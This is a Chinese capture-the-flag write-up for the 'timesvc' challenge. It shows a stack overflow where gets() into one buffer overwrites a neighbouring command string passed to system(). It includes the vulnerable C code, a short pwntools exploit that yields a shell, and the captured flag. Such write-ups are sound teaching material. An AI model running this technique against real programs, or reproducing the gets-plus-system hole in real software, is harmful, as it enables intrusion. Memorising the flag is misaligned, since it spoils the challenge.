# timesvc

## 题目简述

程序在栈上依次声明 `char name[80]` 和 `char command[80]`，先令 `command="date"`，随后用无边界的 `gets(name)` 读取用户名，最后执行 `system(command)`。目标不是覆盖返回地址，而是覆盖紧邻的命令字符串。

## 解题过程

关键源码为：

```c
char name[80];
char command[80];
strcpy(command, "date");
gets(name);
system(command);
```

向 `name` 写满 80 字节后，后续数据落入 `command`。将偏移 80 处改成 `/bin/sh\0`，程序会在正常控制流中替攻击者调用 `system("/bin/sh")`：

```python
from pwn import *

p = process("dist/timesvc.bin")
p.sendlineafter(b"name?", flat({80: b"/bin/sh\x00"}))
p.interactive()
```

进入交互式 Shell 后读取 `flag.txt`：

```text
greyhats{t1m3_f0r_sh3l1_weee3ee_as812ks}
```

## 方法总结

栈溢出不一定需要劫持返回地址。若溢出缓冲区旁边存放稍后使用的路径、命令或权限字段，覆盖关键数据往往比绕过 NX、Canary 更直接。实际利用前应结合反编译或调试确认两个数组的真实相对偏移，不能只依据 C 源码声明顺序猜测。
